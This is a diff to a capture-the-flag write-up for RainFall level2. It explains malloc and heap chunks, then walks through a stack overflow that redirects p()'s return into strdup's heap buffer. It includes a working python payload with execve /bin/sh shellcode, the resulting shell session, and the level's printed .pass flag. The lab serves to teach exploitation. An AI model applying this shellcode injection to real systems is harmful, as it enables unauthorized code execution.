@@ -123,7 +123,67 @@ malloc() use the heap section of memory which is located in a completely differe
 
 ### What is the heap ? And malloc ?
 
-The heap is basically a big chunck of memory available in case we need to allocate more space for vairables in our code. We very often instantly talk about malloc and free when talking about the heap but those functions actually comes from the libc and uses mmap() and brk(). We are still gonna focus on malloc because most of the libc functions uses it and strdup is no exception. Also to be more precise we are gonna go deeper in the dlmalloc (dl coming from the name of the person who codes this version of malloc) which is the most comonly used.
+The heap is basically a big chunck of memory available in case we need to allocate more space for vairables in our code. We very often instantly talk about malloc and free when talking about the heap but those functions actually comes from the libc and uses mmap() and brk(). We are still gonna focus on malloc because most of the libc functions uses it and strdup is no exception. Also to be more precise we are gonna go a little deeper in the dlmalloc (dl coming from the name of the person who codes this version of malloc) which is the most comonly used.
+
+When you request malloc some space it will first select a chunk of memory in the heap that is made for the size of the malloc requested. Different chunk of the memory are made for different size of data, some for very long and heavy data, others for short and light data. When a chuck is decided malloc is gonna check the address of the next free slot in this chunck by checking the "bin" (name given to this structure) that contains the basic informations of the chunck such as the first address of the chuck, the last address of the chunck and other infos. Inside a chunck malloc is organised such as the data is stored in a double chained list. Each element of this list will get a header too containing some informations as you can see below: (malloc.png)
+
+![Malloc](https://github.com/kbarbry/RainFall/blob/main/level2/Resources/malloc.png)
+
+The data here is stored in the "payload" element.
+
+### Epiphany
+
+The solutions was not coming, after all those researches I understood a lot but still can't figure out a solution. So I tried to take it from the beginning all over again and this is when I understood completely what was happening.
+
+When I showed earlier this example:
+
+```
+|          buffer(76)          |   SFP (4)   | Ret_addr (4) |
+```
+
+I talked about the return address and instantly thought it was the return address of the callee function, which is not the case, it is the return address of the calling function, which now changes everything!
+In the logic of our program, main is gonna launch p(), and then p() is gonna is gonna call gets function. How the stacks look like at this moment (if I understand well) is like this:
+
+```sh
+[buffer]        # local variable in p
+[SFP]           # the save frame pointer
+[Ret addr]      # which is the ret addr of p
+[calling gets]  # not an actual element of the stack but gets get called here
+```
+
+The return address of gets would be lower down but buffer is initialized therefore stored right before the SFP and the return address of p(), and not the return address of gets() like I thought.
+So if we follow the execution, buffer is going to overwrite the return address of p(), gets() comes back to p(), then the if statement acting as an anti buffer overflow is being called, finally puts and strdup are called, and p() return but instead of returning to main, it returns to the overwritten address.
+
+Since the check is made after the overflow is done but that the return address is accessed only at the end of p() we can still forget the idea of pointing it back to the buffer location, which is still in the stack and would be caught by the if statement. However we know that strdup is called, and that the heap is at the lower addresses so the if statement would not be triggered. The last thing we have to find is what is the malloc address received by the program but never used?
+
+In order to find this we can use ltrace which is gonna list the return address of every function called in the executable:
+
+```sh
+level2@RainFall:~$ ltrace ./level2 
+__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
+fflush(0xb7fd1a20)                                         = 0
+gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)              = 0xbffff6fc
+puts("")                                                   = 1
+strdup("")                                                 = 0x0804a008
++++ exited (status 8) +++
+```
+
+The interesting result here is the return address of strdup() that shows 0x0804a008. We are indeed not in the range of the 0xb... addresses. So we tried to write the exploit using this time this address and:
+
+```sh
+level2@RainFall:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/payload2
+level2@RainFall:~$ cat /tmp/payload2 -| ./level2
+j
+ X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
+
+As we can see our exploit uses a shellcode, then fill the rest of the buffer with A (could have been \x90 for NOP), and add the malloc result address. When p() returns, it return to the wrong address, goes into the heap and stat executing the shellcode, we then just have to print the .pass file and we have our flag.
+
+We went way too deep for an easy solution but I still want to leave all those explanations as I find them interesting for stack and heap understanding.
 
 ## Important doc
 
@@ -142,3 +202,5 @@ The heap is basically a big chunck of memory available in case we need to alloca
 [Overflow deep explaination](http://theamazingking.com/tut1.php) !NOT HTTPS
 
 [Shellcode DataBase](https://shell-storm.org/shellcode/index.html)
+
+[Malloc explained](https://sourceware.org/glibc/wiki/MallocInternals)
